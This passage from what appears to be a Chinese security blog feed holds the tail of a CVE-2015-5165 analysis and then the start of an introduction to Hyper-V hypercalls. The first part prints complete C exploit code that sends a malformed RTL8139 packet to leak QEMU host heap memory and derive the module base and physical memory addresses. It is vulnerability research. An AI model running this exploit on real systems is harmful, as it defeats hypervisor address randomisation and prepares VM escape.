mode</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL_8139_rx_mode_bits </span><br><span class="line">&#123;</span><br><span class="line">    AcceptErr       = <span class="number">0x20</span>,</span><br><span class="line">    AcceptRunt      = <span class="number">0x10</span>,</span><br><span class="line">    AcceptBroadcast = <span class="number">0x08</span>,</span><br><span class="line">    AcceptMulticast = <span class="number">0x04</span>,</span><br><span class="line">    AcceptMyPhys    = <span class="number">0x02</span>,</span><br><span class="line">    AcceptAllPhys   = <span class="number">0x01</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL_8139_CplusCmdBits </span><br><span class="line">&#123;</span><br><span class="line">    CPlusRxVLAN   = <span class="number">0x0040</span>, <span class="comment">/* enable receive VLAN detagging */</span></span><br><span class="line">    CPlusRxChkSum = <span class="number">0x0020</span>, <span class="comment">/* enable receive checksum offloading */</span></span><br><span class="line">    CPlusRxEnb    = <span class="number">0x0002</span>,</span><br><span class="line">    CPlusTxEnb    = <span class="number">0x0001</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RT8139_ChipCmdBits </span><br><span class="line">&#123;</span><br><span class="line">    CmdReset    = <span class="number">0x10</span>,</span><br><span class="line">    CmdRxEnb    = <span class="number">0x08</span>,</span><br><span class="line">    CmdTxEnb    = <span class="number">0x04</span>,</span><br><span class="line">    RxBufEmpty  = <span class="number">0x01</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL8139_TxPollBits </span><br><span class="line">&#123;</span><br><span class="line">    CPlus = <span class="number">0x40</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 Rx / Tx descriptor</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> dw0;</span><br><span class="line">    <span class="keyword">uint32_t</span> dw1;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_lo;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_hi;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 Rx / Tx ring</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_ring</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span>* <span class="title">desc</span>;</span></span><br><span class="line">    <span class="keyword">void</span>* buffer;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> rtl8139_packet[] = </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Ethernet Frame Header 数据</span></span><br><span class="line">    <span class="comment">// DST MAC 52:54:00:12:34:57</span></span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x57</span>, </span><br><span class="line">    <span class="comment">// SRC MAC 52:54:00:12:34:57</span></span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x57</span>, </span><br><span class="line">    <span class="comment">// Length / Type: IPv4</span></span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0x00</span>, </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Ethernet Frame Payload 数据, 即 IPv4 数据包</span></span><br><span class="line">    <span class="comment">// Version &amp; IHL(Internet Header Length)</span></span><br><span class="line">    (<span class="number">0x04</span> &lt;&lt; <span class="number">4</span>) | <span class="number">0x05</span>,    <span class="comment">// 0x05 * 4 = 20 bytes</span></span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// Total Length = 0x13 = 19 bytes</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x13</span>,     <span class="comment">// 19 - 20 = -1 = 0xFFFF, trigger vulnerability</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Identification</span></span><br><span class="line">    <span class="number">0x40</span>, <span class="number">0x00</span>,     <span class="comment">// Flags &amp; Fragment Offset</span></span><br><span class="line">    <span class="number">0x40</span>,           <span class="comment">// TTL</span></span><br><span class="line">    <span class="number">0x06</span>,           <span class="comment">// Protocol: TCP</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Header checksum</span></span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="comment">// Source IP: 127.0.0.1</span></span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="comment">// Destination IP: 127.0.0.1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// IP Packet Payload 数据, 即 TCP 数据包</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Source Port</span></span><br><span class="line">    <span class="number">0xbe</span>, <span class="number">0xef</span>,     <span class="comment">// Destination Port</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="comment">// Sequence Number</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="comment">// Acknowledgement Number</span></span><br><span class="line">    <span class="number">0x50</span>,           <span class="comment">// 01010000, Header Length = 5 * 4 = 20</span></span><br><span class="line">    <span class="number">0x10</span>,           <span class="comment">// 00010000, ACK</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Window Size</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// TCP checksum</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>      <span class="comment">// Urgent Pointer</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> get_physical_pfn(<span class="keyword">void</span>* addr) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pfn = <span class="number">-1</span>;</span><br><span class="line">    FILE* fp = fopen(<span class="string">"/proc/self/pagemap"</span>, <span class="string">"rb"</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fp) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> pfn;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!fseek(fp, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)addr / PAGE_SIZE * <span class="number">8</span>, SEEK_SET)) </span><br><span class="line">    &#123;</span><br><span class="line">        fread(&amp;pfn, <span class="keyword">sizeof</span>(pfn), <span class="number">1</span>, fp);</span><br><span class="line">        <span class="keyword">if</span> (pfn &amp; PFN_PRESENT) </span><br><span class="line">        &#123;</span><br><span class="line">            pfn &amp;= PFN_PFN;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> pfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> gva_to_gpa(<span class="keyword">void</span>* addr) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pfn = get_physical_pfn(addr);</span><br><span class="line">    <span class="keyword">return</span> pfn * PAGE_SIZE + (<span class="keyword">uint64_t</span>)addr % PAGE_SIZE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_desc_config_rx</span><span class="params">(rtl8139_ring* ring, rtl8139_desc* desc, <span class="keyword">size_t</span> nb)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> buffer_size = RTL8139_BUFFER_SIZE + <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; nb; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;desc[i], <span class="number">0</span>, <span class="keyword">sizeof</span>(desc[i]));</span><br><span class="line">        ring[i].desc = &amp;desc[i];</span><br><span class="line">        </span><br><span class="line">        ring[i].buffer = aligned_alloc(PAGE_SIZE, buffer_size);</span><br><span class="line">        <span class="built_in">memset</span>(ring[i].buffer, <span class="number">0</span>, buffer_size);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// descriptor owned by NIC 准备接收数据</span></span><br><span class="line">        ring[i].desc-&gt;dw0 |= CP_RX_OWN;</span><br><span class="line">        <span class="keyword">if</span> (i == nb - <span class="number">1</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            ring[i].desc-&gt;dw0 |= CP_RX_EOR; <span class="comment">// End of Ring</span></span><br><span class="line">        &#125;</span><br><span class="line">        ring[i].desc-&gt;dw0 &amp;= ~CP_RX_BUFFER_SIZE_MASK;</span><br><span class="line">        ring[i].desc-&gt;dw0 |= buffer_size;   <span class="comment">// buffer_size</span></span><br><span class="line">        ring[i].desc-&gt;buf_lo = (<span class="keyword">uint32_t</span>)gva_to_gpa(ring[i].buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Rx descriptors address</span></span><br><span class="line">    outl((<span class="keyword">uint32_t</span>)gva_to_gpa(desc), RTL8139_PORT + RxRingAddrLO);</span><br><span class="line">    outl(<span class="number">0</span>, RTL8139_PORT + RxRingAddrHI);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_desc_config_tx</span><span class="params">(rtl8139_desc* desc, <span class="keyword">void</span>* buffer)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(desc, <span class="number">0</span>, <span class="keyword">sizeof</span>(rtl8139_desc));</span><br><span class="line">    desc-&gt;dw0 |= CP_TX_OWN |    <span class="comment">// descriptor owned by NIC 准备发送数据</span></span><br><span class="line">                 CP_TX_EOR |</span><br><span class="line">                 CP_TX_LS |</span><br><span class="line">                 CP_TX_LGSEN |</span><br><span class="line">                 CP_TX_IPCS |</span><br><span class="line">                 CP_TX_TCPCS;</span><br><span class="line">    desc-&gt;dw0 += RTL8139_BUFFER_SIZE;</span><br><span class="line">    desc-&gt;buf_lo = (<span class="keyword">uint32_t</span>)gva_to_gpa(buffer);</span><br><span class="line">    outl((<span class="keyword">uint32_t</span>)gva_to_gpa(desc), RTL8139_PORT + TxAddr0);</span><br><span class="line">    outl(<span class="number">0</span>, RTL8139_PORT + TxAddr0 + <span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_card_config</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 触发漏洞需要设置的一些参数</span></span><br><span class="line">    outl(TxLoopBack, RTL8139_PORT + TxConfig);</span><br><span class="line">    outl(AcceptMyPhys, RTL8139_PORT + RxConfig);</span><br><span class="line">    outw(CPlusRxEnb | CPlusTxEnb, RTL8139_PORT + CpCmd);</span><br><span class="line">    outb(CmdRxEnb | CmdTxEnb, RTL8139_PORT + ChipCmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_packet_send</span><span class="params">(<span class="keyword">void</span>* buffer, <span class="keyword">void</span>* packet, <span class="keyword">size_t</span> len)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (len &lt;= RTL8139_BUFFER_SIZE) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(buffer, packet, len);</span><br><span class="line">        outb(CPlus, RTL8139_PORT + TxPoll);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xxd</span><span class="params">(<span class="keyword">uint8_t</span>* ptr, <span class="keyword">size_t</span> size)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; size; ++i, ++j) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">16</span> == <span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            j = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n0x%08x: "</span>, ptr + i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%02x "</span>, ptr[i]);</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">7</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"- "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> scan_leaked_chunks(rtl8139_ring* ring, <span class="keyword">size_t</span> ring_count,</span><br><span class="line">                          <span class="keyword">size_t</span> chunk_size, <span class="keyword">void</span>** chunks, <span class="keyword">size_t</span> chunk_count) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">size_t</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; ring_count; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Ethernet Frame Header: 14 +</span></span><br><span class="line">        <span class="comment">// IP Header: 20 +</span></span><br><span class="line">        <span class="comment">// TCP Header: 20 = 54</span></span><br><span class="line">        <span class="keyword">uint8_t</span>* ptr = (<span class="keyword">uint8_t</span>*)ring[i].buffer + <span class="number">56</span>;</span><br><span class="line">        <span class="keyword">uint8_t</span>* end = (<span class="keyword">uint8_t</span>*)ring[i].buffer + RTL8139_BUFFER_SIZE / <span class="number">4</span> * <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">while</span> (ptr &lt; end) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">uint64_t</span> size = *(<span class="keyword">uint64_t</span>*)ptr &amp; CHUNK_SIZE_MASK;</span><br><span class="line">            <span class="keyword">if</span> (size == chunk_size) </span><br><span class="line">            &#123;</span><br><span class="line">                chunks[count++] = (<span class="keyword">void</span>*)(ptr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            ptr += <span class="number">4</span>;</span><br><span class="line">            <span class="keyword">if</span> (count &gt; chunk_count) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> count;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> leak_module_base_addr(<span class="keyword">void</span>** chunks, <span class="keyword">size_t</span> count) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint64_t</span> property_get_bool_offset = <span class="number">0x377F66</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint64_t</span> mask = <span class="number">0x00000FFF</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; count; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint64_t</span>* ptr = (<span class="keyword">uint64_t</span>*)chunks[i] + <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span> ((*ptr &amp; mask) == (property_get_bool_offset &amp; mask)) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"property_get_bool: 0x%"</span> PRIx64 <span class="string">"\n"</span>, *ptr);</span><br><span class="line">            <span class="keyword">return</span> *ptr - property_get_bool_offset;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> leak_physical_memory_addr(rtl8139_ring* ring, <span class="keyword">size_t</span> ring_count) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint64_t</span> mask = <span class="number">0xffff000000</span>ull;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="built_in">array</span>[<span class="number">0x10000</span>];</span><br><span class="line">    <span class="keyword">size_t</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(<span class="built_in">array</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="built_in">array</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; ring_count; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint8_t</span>* ptr = (<span class="keyword">uint8_t</span>*)ring[i].buffer + <span class="number">56</span>;</span><br><span class="line">        <span class="keyword">uint8_t</span>* end = (<span class="keyword">uint8_t</span>*)ring[i].buffer + RTL8139_BUFFER_SIZE / <span class="number">4</span> * <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">while</span> (ptr &lt; end - <span class="number">8</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">uint64_t</span> value = *(<span class="keyword">uint64_t</span>*)ptr;</span><br><span class="line">            <span class="keyword">if</span> (((value &gt;&gt; <span class="number">40</span>) &amp; <span class="number">0xff</span>) == <span class="number">0x7f</span>) </span><br><span class="line">            &#123;</span><br><span class="line">                value = (value &amp; mask) &gt;&gt; <span class="number">24</span>;</span><br><span class="line">                <span class="built_in">array</span>[value]++;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">array</span>[value] &gt; <span class="built_in">array</span>[index]) </span><br><span class="line">                &#123;</span><br><span class="line">                    index = value;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ptr += <span class="number">4</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">uint64_t</span> memory_size = <span class="number">0x80000000</span>;</span><br><span class="line">    <span class="keyword">return</span> (((<span class="keyword">uint64_t</span>)index | <span class="number">0x7f0000</span>) &lt;&lt; <span class="number">24</span>) - memory_size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 44 * RTL8139_BUFFER_SIZE = 44 * 1514 = 66616</span></span><br><span class="line">    <span class="comment">// 可以收完 65535 字节数据</span></span><br><span class="line">    <span class="keyword">size_t</span> rtl8139_rx_nb = <span class="number">44</span>;</span><br><span class="line">    rtl8139_ring* rtl8139_rx_ring = (rtl8139_ring*)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, rtl8139_rx_nb * <span class="keyword">sizeof</span>(struct rtl8139_ring));</span><br><span class="line">    rtl8139_desc* rtl8139_rx_desc = (rtl8139_desc*)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, rtl8139_rx_nb * <span class="keyword">sizeof</span>(struct rtl8139_desc));</span><br><span class="line">    rtl8139_desc* rtl8139_tx_desc = (rtl8139_desc*)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, <span class="keyword">sizeof</span>(struct rtl8139_desc));</span><br><span class="line">    <span class="keyword">void</span>* rtl8139_tx_buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// change I/O privilege level</span></span><br><span class="line">    iopl(<span class="number">3</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// initialize Rx ring, Rx descriptor, Tx descriptor</span></span><br><span class="line">    rtl8139_desc_config_rx(rtl8139_rx_ring, rtl8139_rx_desc, rtl8139_rx_nb);</span><br><span class="line">    rtl8139_desc_config_tx(rtl8139_tx_desc, rtl8139_tx_buffer);</span><br><span class="line">    rtl8139_card_config();</span><br><span class="line">    rtl8139_packet_send(rtl8139_tx_buffer, rtl8139_packet, </span><br><span class="line">                        <span class="keyword">sizeof</span>(rtl8139_packet));</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// print leaked data</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; rtl8139_rx_nb; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// RTL8139_BUFFER_SIZE 之后 4 字节数据为 Checksum</span></span><br><span class="line">        <span class="comment">// 不打印也无所谓了</span></span><br><span class="line">        xxd((<span class="keyword">uint8_t</span>*)rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// exploit</span></span><br><span class="line">    <span class="keyword">void</span>* chunks[CHUNK_COUNT] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">size_t</span> chunk_count = scan_leaked_chunks(rtl8139_rx_ring, rtl8139_rx_nb, </span><br><span class="line">                                            <span class="number">0x60</span>, chunks, CHUNK_COUNT);</span><br><span class="line">    <span class="keyword">uint64_t</span> module_addr = leak_module_base_addr(chunks, chunk_count);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"qemu-system-x86_64: 0x%"</span> PRIx64 <span class="string">"\n"</span>, module_addr);</span><br><span class="line">    <span class="keyword">uint64_t</span> physical_memory_addr = leak_physical_memory_addr(</span><br><span class="line">        rtl8139_rx_ring, rtl8139_rx_nb);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"physical memory address: 0x%"</span> PRIx64 <span class="string">"\n"</span>, physical_memory_addr);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> free heap blocks</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Exploit 测试结果如下：</p><p><img src="/uploads/202006/cve-2015-5165-exploit.png" alt="QEMU 漏洞 CVE-2015-5165 Exploit"></p><h2 id="0x05-分析小结"><a href="#0x05-分析小结" class="headerlink" title="0x05. 分析小结"></a>0x05. 分析小结</h2><p>第一次分析 QEMU 的漏洞，整体感觉还挺有意思的，CVE-2015-5165 这个漏洞本身简单易懂，如果了解网卡基本工作原理的话，Exploit 编写也不是很难。</p><h2 id="0x06-参考文献"><a href="#0x06-参考文献" class="headerlink" title="0x06. 参考文献"></a>0x06. 参考文献</h2><p>[1] <a href="http://www.phrack.org/papers/vm-escape-qemu-case-study.html" target="_blank" rel="noopener">http://www.phrack.org/papers/vm-escape-qemu-case-study.html</a></p><p>[2] <a href="http://patchwork.ozlabs.org/project/qemu-devel/patch/20161228200433.24244-1-cov@codeaurora.org/" target="_blank" rel="noopener">QEMU commands-posix.c patch - &lt;sys/sysmacros.h&gt;</a></p><p>[3] <a href="https://dangokyo.me/2018/03/02/qemu-escape-part-1-environment-set-up/" target="_blank" rel="noopener">https://dangokyo.me/2018/03/02/qemu-escape-part-1-environment-set-up/</a></p><p>[4] <a href="https://www.realvnc.com/en/connect/download/viewer/" target="_blank" rel="noopener">https://www.realvnc.com/en/connect/download/viewer/</a></p><p>[5] <a href="https://shanetully.com/2014/12/translating-virtual-addresses-to-physcial-addresses-in-user-space/" target="_blank" rel="noopener">https://shanetully.com/2014/12/translating-virtual-addresses-to-physcial-addresses-in-user-space/</a></p><p>[6] <a href="https://www.kernel.org/doc/Documentation/vm/pagemap.txt" target="_blank" rel="noopener">https://www.kernel.org/doc/Documentation/vm/pagemap.txt</a></p><p>[7] TCP/IP Illustrated, Volum 1, The protocols, Second Edition, Kevin R. Fall, W. Richard Stevens</p><p>[8] <a href="http://realtek.info/pdf/rtl8139cp.pdf" target="_blank" rel="noopener">http://realtek.info/pdf/rtl8139cp.pdf</a></p><p>[9] <a href="https://www.anquanke.com/post/id/197637" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197637</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;参考 Phrack 文章 &lt;strong&gt;&lt;em&gt;VM escape - QEMU Case Study&lt;/em&gt;&lt;/strong&gt; [1] 对 QEMU 信息泄露漏洞 CVE-2015-5165 和堆溢出漏洞 CVE-2015-7504 进行调试分析并编写 Exploit 代码，本文主要分析其中的 RTL8139 网卡信息泄露漏洞 CVE-2015-5165。&lt;/p&gt;
    
    </summary>
    
      <category term="Virtualization" scheme="https://programlife.net/categories/Virtualization/"/>
    
      <category term="QEMU" scheme="https://programlife.net/categories/Virtualization/QEMU/"/>
    
    
      <category term="QEMU" scheme="https://programlife.net/tags/QEMU/"/>
    
      <category term="RTL8139" scheme="https://programlife.net/tags/RTL8139/"/>
    
      <category term="CVE-2015-5165" scheme="https://programlife.net/tags/CVE-2015-5165/"/>
    
  </entry>
  
  <entry>
    <title>Introduction to Hypercall</title>
    <link href="https://programlife.net/2020/05/20/introduction-to-hypercall/"/>
    <id>https://programlife.net/2020/05/20/introduction-to-hypercall/</id>
    <published>2020-05-20T00:13:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<p>Hyper-V Hypercall 相关基础知识介绍。</p><a id="more"></a><h2 id="0x01-Hypercall-介绍"><a href="#0x01-Hypercall-介绍" class="headerlink" title="0x01. Hypercall 介绍"></a>0x01. Hypercall 介绍</h2><p>Hypercall 用于从虚拟机到 Hypervisor 的状态切换，就像 System Call 用于从用户态到内核态的状态切换一样。</p><h3 id="1-1-Hypercall-Classes"><a href="#1-1-Hypercall-Classes" class="headerlink" title="1.1 Hypercall Classes"></a>1.1 Hypercall Classes</h3><p>Hypercall 可以分为两种不同的类型：简单类型（<strong>Simple</strong>）和重复类型（<strong>Repeat / Rep</strong>）。</p><ul><li>Simple Hypercall 拥有固定大小的输入和输出参数，执行一个单一的操作</li><li>Repeat Hypercall 可以看成是由一系列 Simple Hypercall 组成的</li></ul><p>在发起 Repeat Hypercall 时，调用方需要指明输入输出参数的组数（<em>rep count</em>），以及将要被处理的输入输出参数的索引数（<em>rep start index</em>）；Hypervisor 将按照顺序处理对应的数据。</p><h3 id="1-2-Hypercall-Continuation"><a href="#1-2-Hypercall-Continuation" class="headerlink" title="1.2 Hypercall Continuation"></a>1.2 Hypercall Continuation</h3><p>Hypervisor 会限制 Hypercall 的执行时间在 <code>50μs</code> 以内，超过该时间限制的 Hypercall 依赖于一种叫做 Hypercall Continuation 的机制来完成，该机制对调用方而言基本是透明的。</p><p>对于无法在 <code>50μs</code> 的时间限制内完成的 Hypercall，当控制权从 Hypervisor 返回到虚拟机之后，对应的 RIP 寄存器的值并不会改变；当对应的线程再次获得执行机会时，原有的 Hypercall 会被继续执行。显然，在 Hypercall 完成执行的过程中需要维护一个状态，类似 Repeat Hypercall 的执行一样。</p><h3 id="1-3-Hypercall-Atomicity-and-Ordering"><a href="#1-3-Hypercall-Atomicity-and-Ordering" class="headerlink" title="1.3 Hypercall Atomicity and Ordering"></a>1.3 Hypercall Atomicity and Ordering</h3><p>一般来说，Hypercall 的执行是原子的：Simple Hypercall 就是单个的原子操作，Repeat Hypercall 则是一系列的原子操作；对于无法一次执行完毕的 Hypercall（即超过 <code>50μs</code> 时间限制的 Hypercall），则由多个原子操作所组成。</p><h3 id="1-4-Hypercall-Inputs"><a href="#1-4-Hypercall-Inputs" class="headerlink" title="1.4 Hypercall Inputs"></a>1.4 Hypercall Inputs</h3><p>对于任意的 Hypercall，必然至少有一个输入参数，因为肯定需要指定一个编号。在 x64 环境下，该参数通过 <code>RCX</code> 寄存器传递，对应的数据格式如下：</p><p><img src="/uploads/202005/hypercall-input-rcx.png" alt="Hyper-v Hypercall RCX 参数格式"></p><p>对应的说明如下：</p><table><thead><tr><th>字段</th><th>宽度</th><th>含义</th></tr></thead><tbody><tr><td>Call code</td><td>16 bits</td><td>Hypercall 的编号</td></tr><tr><td>Fast</td><td>1 bit</td><td>0 表示基于内存的调用约定，1 表示基于寄存器的调用约定</td></tr><tr><td>Variable header size</td><td>9 bits</td><td>Variable Headr 的大小</td></tr><tr><td>RsvdZ</td><td>5 bits</td><td>必须是 0</td></tr><tr><td>Is Nested</td><td>1 bit</td><td>0 表示由 Guest Hypervisor 处理，1 表示由 L0 Hypervisor 处理</td></tr><tr><td>Rep Count</td><td>12 bits</td><td>Repeat Hypercall 的重复次数（Simple Hypercall 必须是 0）</td></tr><tr><td>RsvdZ</td><td>4 bits</td><td>必须是 0</td></tr><tr><td>Rep Start Index</td><td>12 bits</td><td>Repeat Hypercall 的索引值（Simple Hypercall 必须是 0）</td></tr><tr><td>RsvdZ</td><td>4 bits</td><td>必须是 0</td></tr></tbody></table><p>如果 Fast 的值为 0，那么 <code>RDX</code> 寄存器可以用于传递输入参数的 GPA（Guest Physical Address），<code>R8</code> 寄存器可以用于传递输出参数的 GPA。</p><p>如果 Fast 的值为 1，那么 <code>RDX</code> 和 <code>R8</code> 